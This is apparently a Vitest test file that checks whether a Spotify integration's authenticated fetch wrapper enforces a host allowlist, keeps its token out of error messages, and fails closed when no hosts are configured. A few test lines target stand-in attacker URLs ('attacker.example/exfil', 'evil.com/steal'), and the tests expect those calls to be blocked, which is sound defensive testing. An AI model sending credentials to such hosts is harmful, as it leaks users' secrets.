import { expect, test } from 'vitest'
import {
	type CapabilityArgs,
	type CodemodeNamespace,
	type ExecuteRequestInput,
	IntegrationHostNotAllowedError,
	createAuthenticatedFetch,
} from './codemode-utils.ts'
import { assertIntegrationHostAllowed } from './integration-host-allowlist.ts'

type SecretSetCall = {
	name: string
	value: string
	scope: string
}

const fakeAccessToken = 'test-access-token-abc123'
const spotifyAccessTokenPlaceholder =
	'Bearer {{secret:spotifyAccessToken|scope=user}}'

const spotifyIntegration = {
	name: 'spotify',
	tokenUrl: 'https://accounts.spotify.test/api/token',
	apiBaseUrl: 'https://api.spotify.com/v1',
	flow: 'pkce' as const,
	clientIdValueName: 'spotifyClientId',
	clientSecretSecretName: null,
	accessTokenSecretName: 'spotifyAccessToken',
	refreshTokenSecretName: 'spotifyRefreshToken',
	requiredHosts: ['api.spotify.com', 'cdn.spotify.com'],
}

function createCodemode() {
	const secretSetCalls: Array<SecretSetCall> = []
	const codemode = {
		async integration_get(args: CapabilityArgs) {
			const name = args.name
			expect(name).toBe('spotify')
			return { integration: spotifyIntegration }
		},
		async value_get(args: CapabilityArgs) {
			const name = args.name
			expect(name).toBe('spotifyClientId')
			return { value: 'spotify-client-id' }
		},
		async secret_set(args: CapabilityArgs) {
			const call = args as SecretSetCall
			secretSetCalls.push(call)
			return { name: call.name, scope: call.scope }
		},
	} satisfies CodemodeNamespace

	const fetchCalls: Array<Request> = []
	const fetchStub: typeof globalThis.fetch = async (
		input: ExecuteRequestInput,
		init?: RequestInit,
	) => {
		const request = new Request(input, init)
		fetchCalls.push(request)
		if (request.url === spotifyIntegration.tokenUrl) {
			return new Response(JSON.stringify({ access_token: fakeAccessToken }), {
				status: 200,
				headers: { 'content-type': 'application/json' },
			})
		}
		return new Response(JSON.stringify({ ok: true }), {
			status: 200,
			headers: { 'content-type': 'application/json' },
		})
	}

	return { codemode, secretSetCalls, fetchCalls, fetchStub }
}

async function withPatchedFetch<T>(
	fetchImpl: typeof globalThis.fetch,
	callback: () => Promise<T>,
) {
	const originalFetch = globalThis.fetch
	globalThis.fetch = fetchImpl
	try {
		return await callback()
	} finally {
		globalThis.fetch = originalFetch
	}
}

test('createAuthenticatedFetch enforces integration host allowlists and fails closed without configured hosts', async () => {
	const { codemode, fetchCalls, fetchStub } = createCodemode()

	const authenticatedFetch = await withPatchedFetch(fetchStub, () =>
		createAuthenticatedFetch(codemode, 'spotify'),
	)

	const fetchCallsAfterSetup = fetchCalls.length

	await expect(
		withPatchedFetch(fetchStub, () =>
			authenticatedFetch('https://attacker.example/exfil'),
		),
	).rejects.toThrow(IntegrationHostNotAllowedError)
	expect(fetchCalls.length).toBe(fetchCallsAfterSetup)

	let disallowedError: Error | null = null
	try {
		await withPatchedFetch(fetchStub, () =>
			authenticatedFetch('https://attacker.example/exfil'),
		)
	} catch (error) {
		disallowedError = error as Error
	}
	expect(disallowedError).toBeInstanceOf(IntegrationHostNotAllowedError)
	expect(disallowedError!.message).not.toContain(fakeAccessToken)
	expect(JSON.stringify(disallowedError)).not.toContain(fakeAccessToken)

	const apiResponse = await withPatchedFetch(fetchStub, () =>
		authenticatedFetch('https://api.spotify.com/v1/me'),
	)
	expect(apiResponse.status).toBe(200)
	const apiCall = fetchCalls[fetchCalls.length - 1]!
	expect(apiCall.url).toBe('https://api.spotify.com/v1/me')
	expect(apiCall.headers.get('authorization')).toBe(
		spotifyAccessTokenPlaceholder,
	)

	const cdnResponse = await withPatchedFetch(fetchStub, () =>
		authenticatedFetch('https://cdn.spotify.com/images/cover.jpg'),
	)
	expect(cdnResponse.status).toBe(200)
	const cdnCall = fetchCalls[fetchCalls.length - 1]!
	expect(cdnCall.url).toBe('https://cdn.spotify.com/images/cover.jpg')
	expect(cdnCall.headers.get('authorization')).toBe(
		spotifyAccessTokenPlaceholder,
	)

	expect(() =>
		assertIntegrationHostAllowed(
			'spotify',
			spotifyIntegration,
			'//evil.com/steal',
		),
	).toThrow(IntegrationHostNotAllowedError)
	expect(() =>
		assertIntegrationHostAllowed('spotify', spotifyIntegration, '/v1/me'),
	).not.toThrow()

	const emptyIntegration = {
		...spotifyIntegration,
		requiredHosts: [] as Array<string>,
		apiBaseUrl: null,
	}
	const emptyAllowlistCodemode = {
		async integration_get() {
			return { integration: emptyIntegration }
		},
		async value_get() {
			return { value: 'spotify-client-id' }
		},
		async secret_set(args: CapabilityArgs) {
			const call = args as { name: string; value: string; scope: string }
			return { name: call.name, scope: call.scope }
		},
	} satisfies CodemodeNamespace

	const emptyAllowlistFetchCalls: Array<Request> = []
	const emptyAllowlistFetchStub: typeof globalThis.fetch = async (
		input: ExecuteRequestInput,
		init?: RequestInit,
	) => {
		const request = new Request(input, init)
		emptyAllowlistFetchCalls.push(request)
		if (request.url === emptyIntegration.tokenUrl) {
			return new Response(JSON.stringify({ access_token: fakeAccessToken }), {
				status: 200,
				headers: { 'content-type': 'application/json' },
			})
		}
		return new Response(JSON.stringify({ ok: true }), {
			status: 200,
			headers: { 'content-type': 'application/json' },
		})
	}

	const emptyAllowlistFetch = await withPatchedFetch(
		emptyAllowlistFetchStub,
		() => createAuthenticatedFetch(emptyAllowlistCodemode, 'spotify'),
	)

	const fetchCallsBefore = emptyAllowlistFetchCalls.length

	await expect(
		withPatchedFetch(emptyAllowlistFetchStub, () =>
			emptyAllowlistFetch('https://anything.example/data'),
		),
	).rejects.toThrow(/no allowed hosts configured/)

	expect(emptyAllowlistFetchCalls.length).toBe(fetchCallsBefore)
})
